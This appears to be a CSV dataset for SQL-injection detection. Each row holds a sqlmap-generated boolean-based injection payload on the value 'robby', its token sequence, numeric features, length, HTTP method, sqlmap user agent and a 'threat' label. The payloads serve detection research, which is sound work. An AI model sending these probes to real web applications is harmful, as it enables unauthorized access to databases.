robby'))) AND 2266=2266 AND ((('GUXE'='GUXE,STR SQUT RPRN RPRN RPRN AND INT EQ INT AND LPRN LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.2222222222222222 0.2777777777777778 0.3333333333333333 0.38888888888888884 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.38888888888888884 0.3333333333333333 0.2777777777777778 0.2222222222222222,89,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 2080=5196 AND 'HTqW'='HTqW,STR SQUT AND INT EQ INT AND SQUT STR SQUT EQ SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,71,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 2266=2266 AND 'ObuO'='ObuO,STR SQUT AND INT EQ INT AND SQUT STR SQUT EQ SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,71,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby') AND 4186=7381 AND ('afBA' LIKE 'afBA,STR SQUT RPRN AND INT EQ INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,84,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby') AND 2266=2266 AND ('mInx' LIKE 'mInx,STR SQUT RPRN AND INT EQ INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,84,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) AND 7401=6262 AND (('OeNo' LIKE 'OeNo,STR SQUT RPRN RPRN AND INT EQ INT AND LPRN LPRN SQUT STR SQUT LIKE SQUT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,90,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) AND 2266=2266 AND (('lXnI' LIKE 'lXnI,STR SQUT RPRN RPRN AND INT EQ INT AND LPRN LPRN SQUT STR SQUT LIKE SQUT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,90,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 6126=3716 AND 'azxA' LIKE 'azxA,STR SQUT AND INT EQ INT AND SQUT STR SQUT LIKE SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,78,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 2266=2266 AND 'YHPU' LIKE 'YHPU,STR SQUT AND INT EQ INT AND SQUT STR SQUT LIKE SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,78,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") AND 9275=1514 AND (""moho""=""moho",STR DQUT RPRN AND INT EQ INT AND LPRN DQUT STR DQUT EQ DQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,77,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") AND 2266=2266 AND (""TUxI""=""TUxI",STR DQUT RPRN AND INT EQ INT AND LPRN DQUT STR DQUT EQ DQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,77,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) AND 5790=3856 AND ((""AuwB""=""AuwB",STR DQUT RPRN RPRN AND INT EQ INT AND LPRN LPRN DQUT STR DQUT EQ DQUT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,83,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) AND 2266=2266 AND ((""dlpn""=""dlpn",STR DQUT RPRN RPRN AND INT EQ INT AND LPRN LPRN DQUT STR DQUT EQ DQUT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,83,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 2413=4757 AND ""brrO""=""brrO",STR DQUT AND INT EQ INT AND DQUT STR DQUT EQ DQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,71,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 2266=2266 AND ""JvvT""=""JvvT",STR DQUT AND INT EQ INT AND DQUT STR DQUT EQ DQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,71,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") AND 2661=4282 AND (""cEmv"" LIKE ""cEmv",STR DQUT RPRN AND INT EQ INT AND LPRN DQUT STR DQUT LIKE DQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,84,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") AND 2266=2266 AND (""Uxyy"" LIKE ""Uxyy",STR DQUT RPRN AND INT EQ INT AND LPRN DQUT STR DQUT LIKE DQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,84,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 5618=8715 AND ""hFGG"" LIKE ""hFGG",STR DQUT AND INT EQ INT AND DQUT STR DQUT LIKE DQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,78,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 2266=2266 AND ""VVck"" LIKE ""VVck",STR DQUT AND INT EQ INT AND DQUT STR DQUT LIKE DQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,78,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') AND 4528=6050 AND ('%'=',STR PRCNT SQUT RPRN AND INT EQ INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,75,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') AND 2266=2266 AND ('%'=',STR PRCNT SQUT RPRN AND INT EQ INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,75,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%')) AND 2339=3442 AND (('%'=',STR PRCNT SQUT RPRN RPRN AND INT EQ INT AND LPRN LPRN SQUT PRCNT SQUT EQ SQUT,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,81,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%')) AND 2266=2266 AND (('%'=',STR PRCNT SQUT RPRN RPRN AND INT EQ INT AND LPRN LPRN SQUT PRCNT SQUT EQ SQUT,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,81,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%' AND 4300=7028 AND '%'=',STR PRCNT SQUT AND INT EQ INT AND SQUT PRCNT SQUT EQ SQUT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,69,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%' AND 2266=2266 AND '%'=',STR PRCNT SQUT AND INT EQ INT AND SQUT PRCNT SQUT EQ SQUT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,69,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby%"" AND 1828=8071 AND ""%""=""",STR PRCNT DQUT AND INT EQ INT AND DQUT PRCNT DQUT EQ DQUT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,69,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby) AND 7781=3555-- PytB,STR RPRN AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby) AND 2096=5199 AND (5960=5960,STR RPRN AND INT EQ INT AND LPRN INT EQ INT,0.4 0.5 0.6000000000000001 0.7000000000000001 0.8 0.8 0.8 0.7000000000000001 0.6000000000000001 0.5 0.4,65,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby) AND 2266=2266 AND (1874=1874,STR RPRN AND INT EQ INT AND LPRN INT EQ INT,0.4 0.5 0.6000000000000001 0.7000000000000001 0.8 0.8 0.8 0.7000000000000001 0.6000000000000001 0.5 0.4,65,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby)) AND 2266=2266 AND ((1860=1860,STR RPRN RPRN AND INT EQ INT AND LPRN LPRN INT EQ INT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,71,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby))) AND 6021=1793 AND (((9696=9696,STR RPRN RPRN RPRN AND INT EQ INT AND LPRN LPRN LPRN INT EQ INT,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,77,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 8626=6371,STR AND INT EQ INT,1.0 1.0 1.0 1.0 1.0,39,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 2266=2266,STR AND INT EQ INT,1.0 1.0 1.0 1.0 1.0,39,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 6145=2347-- rHnU,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 2266=2266-- cwwj,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 5756=3285# ftVT,STR AND INT EQ INT HASH STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,49,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 2266=2266# oVdP,STR AND INT EQ INT HASH STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,49,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 6420=3488-- rVNA,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby') AND 8908=4403-- WeIQ,STR SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) AND 2516=9861-- pFcf,STR SQUT RPRN RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,57,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby'))) AND 5980=3466-- vJst,STR SQUT RPRN RPRN RPRN AND INT EQ INT DSCMT STR,0.4 0.5 0.6000000000000001 0.7000000000000001 0.8 0.8 0.8 0.7000000000000001 0.6000000000000001 0.5 0.4,60,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 7280=8540-- VCxj,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby') AND 2142=7443-- voXq,STR SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) AND 9789=9789-- AFSk,STR SQUT RPRN RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,57,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 5778=4893-- hYjU,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 9789=9789-- hxEI,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") AND 8063=1221-- NGlP",STR DQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) AND 7960=4822-- tfyr",STR DQUT RPRN RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,57,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) AND 9789=9789-- ftHK",STR DQUT RPRN RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,57,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 8304=6326-- RXxu",STR DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 9789=9789-- vBwU",STR DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") AND 2216=4515-- Nvzp",STR DQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 2229=9011-- yalL",STR DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 9789=9789-- LZqu",STR DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') AND 7485=5945-- MrXh,STR PRCNT SQUT RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,57,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') AND 9789=9789-- ORYT,STR PRCNT SQUT RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,57,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%')) AND 9789=9789-- lmpK,STR PRCNT SQUT RPRN RPRN AND INT EQ INT DSCMT STR,0.4 0.5 0.6000000000000001 0.7000000000000001 0.8 0.8 0.8 0.7000000000000001 0.6000000000000001 0.5 0.4,60,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby%"" AND 4614=1366-- bMNB",STR PRCNT DQUT AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby) AND 5289=7459-- FfaU,STR RPRN AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby) AND 5875=1621-- fnVt,STR RPRN AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby) AND 9789=9789-- pKMe,STR RPRN AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby)) AND 1923=6870-- SxSu,STR RPRN RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby)) AND 9789=9789-- WXYc,STR RPRN RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby))) AND 6129=2448-- UxUh,STR RPRN RPRN RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,57,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby))) AND 9789=9789-- nZXh,STR RPRN RPRN RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,57,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 8231=3651-- BCqo,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 9309=9214-- MuLs,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 9789=9789-- aDNs,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 7202=1895-- MZDx,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 9789=9789-- yziT,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 9571=9571#,STR SQUT AND INT EQ INT HASH,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,45,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby') AND 9571=9571#,STR SQUT RPRN AND INT EQ INT HASH,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) AND 6565=2604#,STR SQUT RPRN RPRN AND INT EQ INT HASH,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) AND 9571=9571#,STR SQUT RPRN RPRN AND INT EQ INT HASH,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
